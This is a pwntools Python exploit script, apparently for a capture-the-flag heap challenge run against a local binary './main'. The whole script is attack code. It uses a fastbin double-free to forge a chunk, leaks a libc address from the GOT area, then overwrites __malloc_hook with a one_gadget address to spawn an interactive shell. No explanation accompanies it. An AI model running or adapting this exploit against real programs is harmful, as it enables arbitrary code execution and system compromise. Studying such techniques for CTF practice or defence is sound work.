from pwn import*
def add(size, content):
    p.sendline("1")
    p.sendlineafter("What's your heap_size?\n", str(size))
    p.sendafter("What's your heap_content?\n", content)
    p.recvuntil("4. exit\n")

def free(index):
    p.sendline("2")
    p.sendlineafter("What's your heap_index?\n", str(index))
    p.recvuntil("4. exit\n")

def show(index):
    p.sendline("3")
    p.sendlineafter("What's your heap_index?\n", str(index))
    p.recvuntil(": ")
    data = p.recvline()[:-1]
    p.recvuntil("4. exit\n")
    return data

p = process('./main')
p.recvline("What's your name?\n")
p.send(p64(0) + p64(0x61))
p.recvuntil("4. exit\n")

add(0x50,"FMYY")	#0
add(0x50,"FMYY")	#1
free(0)
free(1)
free(0)
add(0x50,p64(0x602060)) #2
add(0x50,"FMYY") #3
add(0x50,"FMYY") #4
add(0x50,p64(0) + p64(0x80) + p64(0x601FB0) + p64(0)*7) #5
libc_base = u64(show(0).ljust(8,"\x00")) - 0x6F690
malloc_hook = libc_base + 0x3C4B10
one_gadget = libc_base + 0xF1147

add(0x60,"FMYY")	#1
add(0x60,"FMYY")	#2
free(1)
free(2)
free(1)
add(0x60,p64(malloc_hook-0x23)) #1
add(0x60,"FMYY") #2
add(0x60,"FMYY") #1
add(0x60,"\x00"*19 + p64(one_gadget))
p.sendline('1')
p.sendlineafter('heap_size?','16')
p.interactive()

